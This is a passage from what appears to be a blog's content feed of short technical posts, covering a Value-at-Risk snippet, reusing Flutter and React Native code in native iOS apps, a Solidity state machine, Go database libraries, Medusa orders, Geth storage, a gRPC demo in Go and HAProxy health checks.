class="line">plt.xlabel(<span class="string">&#x27;Return&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Frequency&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设初始投资金额为100万美元，得到VaR值为 33185</span></span><br><span class="line">initial_investment  = <span class="number">1000000</span></span><br><span class="line">VaR = initial_investment*np.percentile(daily_returns,(<span class="number">1.0</span>-confidence_level)*<span class="number">100</span>)</span><br><span class="line">print(<span class="string">&#x27;The value at risk is %.0f&#x27;</span> % VaR)</span><br></pre></td></tr></table></figure>

<p>若为了获得更多的场景，更多的模拟，这里的计算量会迅速上升，从而导致整体的运算速度较慢。</p>
<p>关联阅读 - <a href="https://willzhuang.github.io/2022/11/21/FMR-%E6%B3%A2%E5%8A%A8%E7%8E%87/">FMR-波动率</a></p>
]]></content>
      <tags>
        <tag>金融</tag>
      </tags>
  </entry>
  <entry>
    <title>Flutter和React-Native项目如何被原生App所重用</title>
    <url>/2024/01/10/Flutter%E5%92%8CReact-Native%E9%A1%B9%E7%9B%AE%E5%A6%82%E4%BD%95%E8%A2%AB%E5%8E%9F%E7%94%9FApp%E6%89%80%E9%87%8D%E7%94%A8/</url>
    <content><![CDATA[<p>继续讨论 <a href="https://github.com/0xPolygonID/polygonid-flutter-sdk">https://github.com/0xPolygonID/polygonid-flutter-sdk</a> ，其中使用了c-polygonid / witnesscalc / rapidsnark / babyjubjub 这4个外部lib库，有c，golang，rust等编译后得到的 .a 文件。那么Flutter开发的部分内容，如手机DB存储等如何重用呢？</p>
<h3 id="Flutter-开发的代码，通过如下方式可以被原生App重用"><a href="#Flutter-开发的代码，通过如下方式可以被原生App重用" class="headerlink" title="Flutter 开发的代码，通过如下方式可以被原生App重用"></a>Flutter 开发的代码，通过如下方式可以被原生App重用</h3><p>打包多个静态原生库成为一个xcframework库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xcodebuild -create-xcframework -library &lt;path/to/lib1&gt; -headers &lt;header directory for lib1&gt; -library &lt;path/to/lib2&gt; -headers &lt;header directory for lib2&gt; -output &lt;path/to/output.xcframework&gt;</span><br></pre></td></tr></table></figure>
<p>但是，一个.xcframework 文件在每一个平台中，如macOS，iOS中，只能含有一个静态库。所以可以如下。<br>第一步，<a href="https://www.unix.com/man-page/OSX/1/lipo/">https://www.unix.com/man-page/OSX/1/lipo/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lipo -info</span><br><span class="line">lipo -create &lt;path/to/lib1&gt; &lt;path/to/lib2&gt; -output &lt;path/to/combineLib&gt;</span><br><span class="line">lipo &lt;path/to/Fatlib&gt; -thin arm64 -output &lt;path/to/arm64Lib&gt;</span><br><span class="line">lipo &lt;path/to/Fatlib&gt; -thin x86_64 -output &lt;path/to/x86_64Lib&gt;</span><br></pre></td></tr></table></figure>
<p>在 arm64 iOS 设备中，.xcframework / thin lib / fat lib 绝可以调试开发；在 arm64 iOS Simulators仿真中，目前尚无法调试开始 fat lib。</p>
<p>第二步，得到FlutterEngine，即Flutter.framework文件。运行 <code>flutter builld ios-framework</code> 命令后， 从 dart 库编译为 ios framework 的时候，在本地 flutter 电脑中，安装好的工具链目录里在直接 copy 得到 Flutter.framework 文件。<br><img src="/2024/01/10/Flutter%E5%92%8CReact-Native%E9%A1%B9%E7%9B%AE%E5%A6%82%E4%BD%95%E8%A2%AB%E5%8E%9F%E7%94%9FApp%E6%89%80%E9%87%8D%E7%94%A8/3.png"><br>从该命令来看， Flutter.xcframework 是直接 copy 的，app.xcframework 是编译的（从dart），Build plugins 是编译 Flutter  SDK 项目用到的第三方库的 framework文件。</p>
<p>总体来看，调用链条如下</p>
<pre><code>App &lt;--&gt; Polygon SDK &lt;--&gt; FlutterEngine(Flutter.framework) &lt;--&gt; PolygonFlutterChannel(dart) &lt;--&gt; UsercaseClass(dart) &lt;--&gt; NativeLibs(swift/c/golang/rust)</code></pre>
<h3 id="React-Native-开发的代码，通过如下方式可以被原生App重用"><a href="#React-Native-开发的代码，通过如下方式可以被原生App重用" class="headerlink" title="React Native 开发的代码，通过如下方式可以被原生App重用"></a>React Native 开发的代码，通过如下方式可以被原生App重用</h3><p><a href="https://github.com/facebook/hermes">https://github.com/facebook/hermes</a> - A JavaScript engine optimized for running React Native. Hermes is a JavaScript engine optimized for fast start-up of <a href="https://reactnative.dev/">React Native</a> apps. It features ahead-of-time static optimization and compact bytecode.<br>第一步，<a href="https://reactnative.dev/docs/hermes%EF%BC%8C">https://reactnative.dev/docs/hermes，</a> 在该文档中，<code>pod install</code> 执行之后，如iOS开发端，hermes.xcframework 即已经被拉到本地，如下图。<br><img src="/2024/01/10/Flutter%E5%92%8CReact-Native%E9%A1%B9%E7%9B%AE%E5%A6%82%E4%BD%95%E8%A2%AB%E5%8E%9F%E7%94%9FApp%E6%89%80%E9%87%8D%E7%94%A8/1.png"></p>
<p>第二步，从 Reactnative 项目代码打包到 jsbundle 资源文件。具体流程是放在了 Xcode 工程里的一个自定义脚本这里，每次Xcodes编译 App 的时候，就会根据情况来对 js 打包。<br><img src="/2024/01/10/Flutter%E5%92%8CReact-Native%E9%A1%B9%E7%9B%AE%E5%A6%82%E4%BD%95%E8%A2%AB%E5%8E%9F%E7%94%9FApp%E6%89%80%E9%87%8D%E7%94%A8/2.png"><br>总体来说，native swift/OC 通过调用 hermes 来调用 React-Native 中的JS 代码逻辑。</p>
]]></content>
      <tags>
        <tag>mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>FSM-in-solidity</title>
    <url>/2020/01/20/FSM-in-solidity/</url>
    <content><![CDATA[<p>参考链接 ==&gt; <a href="https://github.com/blockapps/blockapps-sol">https://github.com/blockapps/blockapps-sol</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract FSM &#123;</span><br><span class="line"></span><br><span class="line">    struct Transition &#123;</span><br><span class="line">        uint state;</span><br><span class="line">        uint evt;</span><br><span class="line">        uint newState;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// expose the transitions to the outside world</span></span><br><span class="line">    Transition[] public transitions;</span><br><span class="line"></span><br><span class="line">    mapping (<span class="function"><span class="params">uint</span> =&gt;</span> uint) stateMachine;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">FSM</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handleEvent</span>(<span class="params">uint _state, uint _event</span>) <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stateMachine[calculateKey(_state,_event)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addTransition</span>(<span class="params">uint _state, uint _event, uint _newState</span>) </span>&#123;</span><br><span class="line">        stateMachine[calculateKey(_state, _event)] = _newState;</span><br><span class="line">        transitions.push(Transition(_state, _event, _newState));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">calculateKey</span>(<span class="params">uint _state, uint _event</span>) <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (_state * <span class="number">1000</span>) + _event;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang database tools libraries comparison</title>
    <url>/2023/05/17/Golang%20database%20tools%20libraries%20comparison/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>Feature</th>
<th>Golang database/sql</th>
<th>GORM</th>
<th>SQLC</th>
<th>SQLX</th>
</tr>
</thead>
<tbody><tr>
<td>Type</td>
<td>Standard library</td>
<td>ORM library</td>
<td><strong>Code generation tool</strong></td>
<td>Library extension</td>
</tr>
<tr>
<td>Ease of use</td>
<td><strong>Low</strong> - manual mapping SQL fields to variables</td>
<td>High</td>
<td>Medium</td>
<td>Medium</td>
</tr>
<tr>
<td>SQL Abstraction</td>
<td>None</td>
<td>High</td>
<td>Medium (Type-safe SQL)</td>
<td>Low</td>
</tr>
<tr>
<td>Query Building</td>
<td>No</td>
<td>Yes</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>Automatic Struct Mapping</td>
<td>No</td>
<td>Yes</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>Type Safety</td>
<td>No</td>
<td>Yes</td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td>Supported Databases</td>
<td>Any (with driver)</td>
<td>MySQL, PostgreSQL, SQLite, SQL Server</td>
<td><strong>PostgreSQL, MySQL, SQLite</strong></td>
<td>Any (with driver)</td>
</tr>
<tr>
<td>Learning Curve</td>
<td>Low</td>
<td>Medium</td>
<td>Medium</td>
<td>Low</td>
</tr>
<tr>
<td>External Dependency</td>
<td>No</td>
<td>Yes</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>Performance on high load</td>
<td>High</td>
<td><strong>Low</strong></td>
<td>High</td>
<td>High</td>
</tr>
<tr>
<td>Code generation</td>
<td>No</td>
<td>No</td>
<td>Yes - Catch SQL query errors before generating codes</td>
<td>Yes - Failure won’t occur until runtime</td>
</tr>
</tbody></table>
<p><a href="https://sqlc.dev/">SQLC</a> + <a href="https://github.com/golang-migrate/migrate">migrate</a> is the prefect choice if the database is PostgreSQL.</p>
<p>This is the detail guide movie here ==&gt; <a href="https://www.youtube.com/watch?v=0CYkrGIJkpw">https://www.youtube.com/watch?v=0CYkrGIJkpw</a> (Generate CRUD Golang code from SQL | Compare db/sql, gorm, sqlx &amp; sqlc)</p>
]]></content>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>2.How to complete an order in medusa</title>
    <url>/2022/04/26/2.How%20to%20complete%20an%20order%20in%20medusa/</url>
    <content><![CDATA[<h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>How can I finish (or complete) an order? I already run Capture an Order -&gt; Create a Fulfillment -&gt; Create a Shipment successfully, but the order status is “pending” in DB. (in Ubuntu / medusa version <a href="https://github.com/medusajs/medusa/releases/tag/v1.7.12">v1.7.12</a>)</p>
<h3 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a>Answer</h3><p>You can create a simple subscriber, that listens for order completion events:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderSubscriber</span> </span>&#123;</span><br><span class="line">  constructor(&#123; orderService, eventBusService &#125;) &#123;</span><br><span class="line">    <span class="keyword">this</span>.orderService_ = orderService;</span><br><span class="line">    eventBusService.subscribe(<span class="string">&quot;order.placed&quot;</span>, <span class="keyword">this</span>.handleOrderPlaced);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleOrderPlaced = async (data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> await <span class="keyword">this</span>.orderService_.update(data.id, &#123; status: <span class="string">&quot;completed&quot;</span> &#125;)</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export <span class="keyword">default</span> OrderSubscriber;</span><br></pre></td></tr></table></figure>



<p>![](2.How to complete an order in medusa/1.png)</p>
]]></content>
      <tags>
        <tag>eCommerce</tag>
      </tags>
  </entry>
  <entry>
    <title>Geth实际运行占用磁盘情况</title>
    <url>/2019/12/20/Geth%E5%AE%9E%E9%99%85%E8%BF%90%E8%A1%8C%E5%8D%A0%E7%94%A8%E7%A3%81%E7%9B%98%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<p>go-ethereum 在 2019 年 7 月推出了 v1.9.x 版本。1.9.x 在数据方面做了重新整理，大概有以下两个非兼容的改动：</p>
<ol>
<li><p>历史的区块链数据(header，body， receipts等)被挪到一个flaten file存储中，因为这部分数据已经是不会更改的了</p>
</li>
<li><p>更改了部分数据结构的scheme，例如receipt。原先很多字段不需要存到db，是可以在read之后重新计算出来的。这部分会占据大量的存储空间，在1.9把这些字段删去了。</p>
</li>
</ol>
<p><code>geth</code> 有一个 <code>inspect</code> 命令，统计数据库详细信息。help中的内容是 <code>inspect，Inspect the storage size for each type of data in the database</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+-----------------+--------------------+------------+</span><br><span class="line">|    DATABASE     |      CATEGORY      |    SIZE    |</span><br><span class="line">+-----------------+--------------------+------------+</span><br><span class="line">| Key-Value store | Headers            | 211.40 KiB |</span><br><span class="line">| Key-Value store | Bodies             | 44.00 B    |</span><br><span class="line">| Key-Value store | Receipts           | 42.00 B    |</span><br><span class="line">| Key-Value store | Difficulties       | 19.07 KiB  |</span><br><span class="line">| Key-Value store | Block number-&gt;hash | 17.24 KiB  |</span><br><span class="line">| Key-Value store | Block hash-&gt;number | 845.67 KiB |</span><br><span class="line">| Key-Value store | Transaction index  | 0.00 B     |</span><br><span class="line">| Key-Value store | Bloombit index     | 0.00 B     |</span><br><span class="line">| Key-Value store | Trie nodes         | 4.79 MiB   |</span><br><span class="line">| Key-Value store | Trie preimages     | 547.13 KiB |</span><br><span class="line">| Key-Value store | Clique snapshots   | 0.00 B     |</span><br><span class="line">| Key-Value store | Singleton metadata | 149.00 B   |</span><br><span class="line">| Ancient store   | Headers            | 5.97 MiB   |</span><br><span class="line">| Ancient store   | Bodies             | 851.64 KiB |</span><br><span class="line">| Ancient store   | Receipts           | 182.32 KiB |</span><br><span class="line">| Ancient store   | Difficulties       | 279.10 KiB |</span><br><span class="line">| Ancient store   | Block number-&gt;hash | 769.77 KiB |</span><br><span class="line">| Light client    | CHT trie nodes     | 0.00 B     |</span><br><span class="line">| Light client    | Bloom trie nodes   | 0.00 B     |</span><br><span class="line">+-----------------+--------------------+------------+</span><br><span class="line">|                         TOTAL        | 14.40 MIB  |</span><br><span class="line">+-----------------+--------------------+------------+</span><br></pre></td></tr></table></figure>

<p>这里的<code>flaten file</code> 存储，其实是把历史数据挪到了 <a href="https://willzhuang.github.io/2019/12/20/Odyssey%E5%AE%9E%E9%99%85%E8%BF%90%E8%A1%8C%E5%8D%A0%E7%94%A8%E7%A3%81%E7%9B%98%E6%83%85%E5%86%B5%E4%BB%8B%E7%BB%8D/"><code>ancient</code></a> 文件夹（在前文亦有size说明），不在用 LeveldDB 存储，而用普通的二进制格式储存数据。</p>
<p>当从更加老的版本升级到 <code>v1.9.x</code> （或者Geth1.9.x重新启动）时，Geth将自动地升级Blocks和Receipts，从 LevelDB 转移到 <code>ancient</code> 文件夹。也可以通过手动设定 <code>ancient</code> 文件夹位置 <code>--datadir.ancient</code> 。</p>
<p><code>chaindata</code> 存放了账本数据（cold data），默认的话，<code>ancient</code> 在 <code>chaindata</code> 里面。<code>state</code> 存放了业务数据（hotdata）。</p>
<ul>
<li>如果 <code>chaindata</code> 账本数据被删除（或者指定到了错误的位置），节点将变得不可用。这种操作是命令禁止的。</li>
<li>如果 <code>state</code> 业务数据被删除，Geth将在 <code>chaindata</code> 账本数据的基础上重建其索引，并在顶部快速同步到丢失的状态数据。</li>
</ul>
<p>参考文档==&gt; <a href="https://blog.ethereum.org/2019/07/10/geth-v1-9-0/">Geth v1.9.0 Six months distilled</a></p>
]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethereum的Whisper通信介绍</title>
    <url>/2019/12/27/Ethereum%E7%9A%84Whisper%E9%80%9A%E4%BF%A1%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>Whisper是Ethereum P2P协议的一部分，可以让消息在同一个区块链内的用户之间传递。</p>
<ul>
<li>Whisper的<a href="https://github.com/ethereum/wiki/wiki/Whisper">使用场景==&gt; link</a></li>
<li>Whisper的<a href="https://github.com/ethereum/go-ethereum/wiki/Whisper-Overview">介绍==&gt; link</a></li>
<li>Whisper的<a href="https://web3js.readthedocs.io/en/v1.2.4/web3-shh.html">web3接口==&gt; link</a></li>
</ul>
<p>Whisper是独立于区块链之外的协议，智能合约不能够使用。</p>
<p>开启Whisper协议， <code>geth -shh</code> </p>
<p>节点默认不会回复消息。所以必须直连到接收人，否者消息将无法发送。</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>Google-Developer-Day-memo1-TF2.0</title>
    <url>/2019/09/10/Google-Developer-Day-memo1-TF2.0/</url>
    <content><![CDATA[<p>2019 Google Developer Day One, picture show，点击下面的连接可以下载到大会的 PPT</p>
<ol>
<li><a href="p.pdf">Mike讲演—《人工智能大发展时代到来》</a></li>
<li><a href="tf2.pdf">《TF 2.0 的技术特性总览》</a></li>
</ol>
]]></content>
      <tags>
        <tag>google</tag>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Google-Developer-Day-memo3-LeTV</title>
    <url>/2019/09/10/Google-Developer-Day-memo3-LeTV/</url>
    <content><![CDATA[<p><a href="letv.pdf">乐视在 Tensorflow 的实践</a></p>
]]></content>
      <tags>
        <tag>google</tag>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Google-Developer-Day-memo4-Optimize</title>
    <url>/2019/09/10/Google-Developer-Day-memo4-Optimize/</url>
    <content><![CDATA[<p><a href="tfoptimize.pdf">Tensorflow 对训练优化的应用</a></p>
]]></content>
      <tags>
        <tag>google</tag>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Google-Developer-Day-memo2-TFLite</title>
    <url>/2019/09/10/Google-Developer-Day-memo2-TFLite/</url>
    <content><![CDATA[<p>2019 Google Developer Day One, picture show，点击下面的连接可以下载到大会的 PPT</p>
<ol>
<li><p><a href="tflite.pdf">Tensorflow Lite 应用</a></p>
</li>
<li><p><a href="arm.pdf">ARM 在人工智能端的应用</a></p>
</li>
</ol>
]]></content>
      <tags>
        <tag>google</tag>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang gRPC笔记</title>
    <url>/2018/03/07/Golang-gRPC%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="gRPC-简介："><a href="#gRPC-简介：" class="headerlink" title="gRPC 简介："></a>gRPC 简介：</h3><blockquote>
<p>gRPC 是一款高性能、开源的 RPC（Remote Procedure Call）框架，产自 Google，基于 ProtoBuf 序列化协议进行开发，支持多种语言（Golang、Python、Java等），本篇只介绍 Golang 的 gRPC 使用。因为 gRPC 对 HTTP/2 协议的支持使其在 Android、IOS 等客户端后端服务的开发领域具有良好的前景。gRPC 提供了一种简单的方法来定义服务，同时客户端可以充分利用 HTTP/2 stream 的特性，从而有助于节省带宽、降低 TCP 的连接次数、节省CPU的使用等。</p>
</blockquote>
<h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><p>gRPC 的安装：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ go get -u google.golang.org/grpc</span><br></pre></td></tr></table></figure>
<p>因为 gRPC 是基于 protobuf 实现的接口序列化，所以也要安装 protobuf： 安装及简介教程(Golang 序列化之 ProtoBuf)。</p>
<p>实验：</p>
<p>下面我们使用 gRPC 定义一个接口，该接口实现对传入的数据进行大写的格式化处理。</p>
<ol>
<li>创建项目 golang Demo 工程：<br><img src="/2018/03/07/Golang-gRPC%E7%AC%94%E8%AE%B0/1.png"></li>
</ol>
<blockquote>
<p>client目录下的 main.go 实现了客户端用于发送数据并打印接收到 server 端处理后的数据</p>
</blockquote>
<ol>
<li>server 目录下的 main.go 实现了服务端用于接收客户端发送的数据，并对数据进行大写处理后返回给客户端</li>
<li>example 包用于编写 proto 文件并生成 data 接口</li>
<li>定义 gRPC 接口：</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> example;</span><br><span class="line">service FormatData &#123;</span><br><span class="line">    rpc DoFormat(Data) returns (Data)&#123;&#125; </span><br><span class="line">    <span class="comment">// 此处定义的方法为简单RPC。其余的服务器端流式 RPC，客户端流式 RPC，双向流式 RPC请查询参考链接</span></span><br><span class="line">&#125;</span><br><span class="line">message Data &#123;</span><br><span class="line">    <span class="keyword">string</span> text = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译 protobuf：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">protoc --go_out=plugins=grpc:. *.proto // 在 example 目录中执行编译，会生成：data.pb.go</span><br></pre></td></tr></table></figure>
<p>实现 server 端：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gRPCDemo/example&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/reflection&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/net/context&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 定义监听地址</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	HOST <span class="keyword">string</span> = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">	PORT <span class="keyword">string</span> = <span class="string">&quot;8080&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">type</span> FormatData <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(fd *FormatData)</span> <span class="title">DoFormat</span><span class="params">(ctx context.Context, in *example.Data)</span> <span class="params">(out *example.Data, err error)</span></span> &#123;</span><br><span class="line">	str := in.Text</span><br><span class="line">	out = &amp;example.Data&#123;Text: strings.ToUpper(str)&#125;</span><br><span class="line">	<span class="keyword">return</span> out, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 直接在 main 方法中注册接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 启动服务器</span></span><br><span class="line">	<span class="comment">// 指定我们期望客户端请求的监听端口</span></span><br><span class="line">	listener, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, HOST+<span class="string">&quot;:&quot;</span>+PORT)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;faile listen at: &quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + PORT)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		log.Println(<span class="string">&quot;Demo server is listening at: &quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + PORT)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建 gRPC 服务器的一个实例</span></span><br><span class="line">	rpcServer := grpc.NewServer()</span><br><span class="line">	<span class="comment">// 在 gRPC 服务器注册我们的服务实现</span></span><br><span class="line">	example.RegisterFormatDataServer(rpcServer, &amp;FormatData&#123;&#125;)</span><br><span class="line">	reflection.Register(rpcServer)</span><br><span class="line">	<span class="comment">// 实现阻塞等待，直到进程被杀死或者 Stop() 被调用</span></span><br><span class="line">	<span class="keyword">if</span> err = rpcServer.Serve(listener); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;faile serve at: &quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + PORT)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现 client 端：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;gRPCDemo/example&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/net/context&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 定义请求地址</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	ADDRESS <span class="keyword">string</span> = <span class="string">&quot;localhost:8080&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// main 方法实现对 gRPC 接口的请求</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 为了调用服务方法，我们首先创建一个 gRPC channel 和服务器交互。</span></span><br><span class="line">	<span class="comment">// 可以使用 DialOptions 在 grpc.Dial 中设置授权认证（如， TLS，GCE认证，JWT认证）</span></span><br><span class="line">	conn, err := grpc.Dial(ADDRESS, grpc.WithInsecure())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;Can&#x27;t connect: &quot;</span> + ADDRESS)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	<span class="comment">// 一旦 gRPC channel 建立起来，我们需要一个客户端 存根 去执行 RPC</span></span><br><span class="line">	client := example.NewFormatDataClient(conn)</span><br><span class="line">	<span class="comment">// 调用简单 RPC</span></span><br><span class="line">	resp,err := client.DoFormat(context.Background(), &amp;example.Data&#123;Text:<span class="string">&quot;hello,world!&quot;</span>&#125;)</span><br><span class="line">	<span class="comment">// 如果调用没有返回错误，那么我们就可以从服务器返回的第一个返回值中读到响应信息</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;Do Format error:&quot;</span> + err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(resp.Text)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行验证结果：<br>先启动 server，之后再执行 client<br>client 侧控制台如果打印的结果为： HELLO,WORLD! ，证明 gRPC 接口定义成功。</p>
<p>参考</p>
<p><a href="http://doc.oschina.net/grpc?t=60133">http://doc.oschina.net/grpc?t=60133</a></p>
<p><a href="https://github.com/grpc/grpc-go">https://github.com/grpc/grpc-go</a></p>
<p><a href="https://grpc.io/">https://grpc.io/</a></p>
]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Google-Developer-Day-memo5-TFX</title>
    <url>/2019/09/10/Google-Developer-Day-memo5-TFX/</url>
    <content><![CDATA[<p>Google Developer Day 2</p>
<p><a href="tfx.pdf">Tensorflow Extension 介绍以及在实践中的应用</a></p>
]]></content>
      <tags>
        <tag>google</tag>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Haproxy的TCP层健康检查</title>
    <url>/2018/11/20/Haproxy%E7%9A%84TCP%E5%B1%82%E5%81%A5%E5%BA%B7%E6%A3%80%E6%9F%A5/</url>
    <content><![CDATA[<p>Haproxy配置为TCP模式，通常会配置健康检查所代理服务的端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frontend main *:6000</span><br><span class="line">    default_backend    app</span><br><span class="line">backend  app</span><br><span class="line">    server app1 192.168.2.10:8080 check</span><br></pre></td></tr></table></figure>
<p>Haproxy的健康检查机制是利用TCP的三次握手。<br>1、首先由Haproxy向代理的服务器发起SYN握手协商，默认是与代理的端口建立链接，比如说8080。<br>2、等待代理服务器确认第一次SYN，并响应ACK，与发起SYN的第二次握手。<br>3、Haproxy收到确认ACK之后，会向代理服务器发送TCP链接重置的报文，已经确认代理的服务器健康。</p>
<p>参考链接：</p>
<blockquote>
<p><a href="https://www.jianshu.com/p/c9f6d55288c0">https://www.jianshu.com/p/c9f6d55288c0</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>Groth16的理解与总结</title>
    <url>/2021/05/12/Groth16%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><a href="Groth16%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E6%80%BB%E7%BB%93/%E4%B8%80%E6%96%87%E4%BA%86%E8%A7%A3%E6%9C%80%E7%83%AD%E9%97%A8%E7%9A%84zkSNARK%E6%96%B9%E6%A1%88-Groth16.pdf">Markdown ==&gt; 一文了解最热门的zkSNARK方案-Groth16.pdf</a></p>
<p><a href="https://github.com/WillZhuang/WillZhuang.github.io/blob/master/2021/05/12/Groth16%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E6%80%BB%E7%BB%93/%E4%B8%80%E6%96%87%E4%BA%86%E8%A7%A3%E6%9C%80%E7%83%AD%E9%97%A8%E7%9A%84zkSNARK%E6%96%B9%E6%A1%88-Groth16.pdf">web ==&gt; 一文了解最热门的zkSNARK方案-Groth16.pdf</a></p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>Headless-Commerce-无头电商与中台随想</title>
    <url>/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/</url>
